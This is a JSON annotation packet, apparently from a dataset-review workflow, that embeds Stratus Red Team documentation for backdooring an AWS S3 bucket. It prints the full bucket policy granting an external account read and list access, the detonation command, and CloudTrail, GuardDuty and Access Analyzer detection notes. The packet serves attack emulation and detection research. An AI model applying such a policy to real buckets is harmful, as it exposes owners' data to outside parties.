@@ -1,0 +1,73 @@
+{
+  "workflow_version": "0.1",
+  "packet_sha256": "ec5c0b24b7292522084391ee78937f5f2a7b67412e48866cdb4aa4cba3dd68cf",
+  "case_id": "stratus:aws.exfiltration.s3-backdoor-bucket-policy",
+  "role": "reviewer",
+  "annotator_id": "annotator_02",
+  "human_attestation": false,
+  "completed_at": null,
+  "path_ontology": {
+    "ontology_id": "cloud_data_path_v1",
+    "version": "1.0.0",
+    "sha256": "4f0cd3b97393781e9cce1a93c7047bb45ce2eddcb62d9392ebc6cbf5c6f2e13e"
+  },
+  "source": {
+    "source_id": "stratus_red_team",
+    "upstream_url": "https://github.com/DataDog/stratus-red-team",
+    "version_or_commit": "52db2f8bbbc85ca7c4292f0035180fc4fa8bfdb0",
+    "license": "Apache-2.0",
+    "provenance_level": "C",
+    "raw_artifacts": [
+      {
+        "raw_ref": "data/real_sources/raw/stratus_red_team/52db2f8bbbc85ca7c4292f0035180fc4fa8bfdb0/snapshot.zip",
+        "sha256": "fa2ad67871887a55f226f875a9c339b7e12987b83aa5a951631ce9f5036d0480"
+      }
+    ]
+  },
+  "candidate_metadata": {
+    "candidate_id": "stratus:aws.exfiltration.s3-backdoor-bucket-policy",
+    "kind": "executable_attack_technique",
+    "platform": "AWS",
+    "technique": "aws.exfiltration.s3-backdoor-bucket-policy",
+    "documentation_path": "stratus-red-team-52db2f8bbbc85ca7c4292f0035180fc4fa8bfdb0/docs/attack-techniques/AWS/aws.exfiltration.s3-backdoor-bucket-policy.md",
+    "raw_ref": "snapshot.zip#stratus-red-team-52db2f8bbbc85ca7c4292f0035180fc4fa8bfdb0/docs/attack-techniques/AWS/aws.exfiltration.s3-backdoor-bucket-policy.md",
+    "review_score": 32,
+    "independence_group": "stratus_red_team:stratus:aws.exfiltration.s3-backdoor-bucket-policy",
+    "runtime_observations_in_packet": 0,
+    "mapped_technique_ids": [],
+    "routing_origin": "deterministic keyword/metadata routing of pinned upstream material; not a label"
+  },
+  "source_materials": [
+    {
+      "raw_ref": "snapshot.zip#stratus-red-team-52db2f8bbbc85ca7c4292f0035180fc4fa8bfdb0/docs/attack-techniques/AWS/aws.exfiltration.s3-backdoor-bucket-policy.md",
+      "member_path": "stratus-red-team-52db2f8bbbc85ca7c4292f0035180fc4fa8bfdb0/docs/attack-techniques/AWS/aws.exfiltration.s3-backdoor-bucket-policy.md",
+      "member_sha256": "22d491a129799596594d6e116916aac886586b74725e610d82294cd1d5a1c9f4",
+      "bytes": 1759,
+      "content_kind": "md",
+      "text": "---\ntitle: Backdoor an S3 Bucket via its Bucket Policy\n---\n\n# Backdoor an S3 Bucket via its Bucket Policy\n\n\n <span class=\"smallcaps w3-badge w3-blue w3-round w3-text-white\" title=\"This attack technique can be detonated multiple times\">idempotent</span> \n\nPlatform: AWS\n\n## Mappings\n\n- MITRE ATT&CK\n    - Exfiltration\n\n\n\n## Description\n\n\nExfiltrates data from an S3 bucket by backdooring its Bucket Policy to allow access from an external, fictitious AWS account.\n\n<span style=\"font-variant: small-caps;\">Warm-up</span>:\n\n- Create an S3 bucket\n\n<span style=\"font-variant: small-caps;\">Detonation</span>:\n\n- Backdoor the S3 Bucket Policy by setting the following Bucket Policy:\n\n<pre>\n<code>\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::193672423079:root\"\n      },\n      \"Action\": [\n        \"s3:GetObject\",\n        \"s3:GetBucketLocation\",\n        \"s3:ListBucket\"\n      ],\n      \"Resource\": [\n        \"arn:aws:s3:::%s/*\",\n        \"arn:aws:s3:::%s\"\n      ]\n    }\n  ]\n}\n</code>\n</pre>\n\n\n## Instructions\n\n```bash title=\"Detonate with Stratus Red Team\"\nstratus detonate aws.exfiltration.s3-backdoor-bucket-policy\n```\n## Detection\n\n\n- Using CloudTrail's <code>PutBucketPolicy</code> event\n\n- Through GuardDuty's [Policy:S3/BucketAnonymousAccessGranted](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-s3.html#policy-s3-bucketanonymousaccessgranted) finding,\nif the S3 bucket was made public (and not only shared with an attacker-controlled AWS account).\n\n- Through [IAM Access Analyzer](https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-analyzer.html),\nwhich generates a finding when an S3 bucket is made public or accessible from another account.\n\n\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    }
+  ],
+  "runtime_instances": [],
+  "source_context_fields": [
+    "candidate_metadata",
+    "runtime_instances",
+    "source",
+    "source_materials"
+  ],
+  "source_context_sha256": "79dcc41f30e632075b4ec2502643e649aeec47825ca71e5ac170fa3ff5825f58",
+  "admission_screen": {
+    "external_or_low_privilege_entry_defined": null,
+    "multi_step_path_present": null,
+    "cloud_data_target_present": null,
+    "critical_edges_have_raw_evidence": null,
+    "not_a_near_duplicate": null,
+    "decision": null,
+    "rationale": null
+  },
+  "nodes": [],
+  "edges": [],
+  "path_labels": [],
+  "tool_tasks": [],
+  "instance_labels": []
+}
